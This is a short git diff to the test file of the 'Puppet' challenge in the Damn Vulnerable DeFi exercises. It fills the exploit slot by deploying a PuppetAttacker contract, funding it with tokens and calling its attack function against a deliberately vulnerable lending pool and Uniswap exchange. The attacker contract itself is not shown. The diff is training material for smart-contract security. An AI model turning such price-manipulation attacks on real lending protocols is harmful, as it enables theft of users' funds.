@@ -12,7 +12,7 @@ const UniswapFactory = contract.fromArtifact('UniswapV1Factory');
 contract.artifactsDir = 'build/contracts';
 const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
 const PuppetPool = contract.fromArtifact('PuppetPool');
-
+const PuppetAttacker = contract.fromArtifact('PuppetAttacker');
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -93,6 +93,9 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        this.puppetAttacker = await PuppetAttacker.new(this.token.address, this.lendingPool.address, this.uniswapExchange.address, { from: attacker });
+        await this.token.transfer(this.puppetAttacker.address, ATTACKER_INITAL_TOKEN_BALANCE, { from: attacker });
+        await this.puppetAttacker.attack(ATTACKER_INITAL_TOKEN_BALANCE, { from: attacker });
     });
 
     after(async function () {
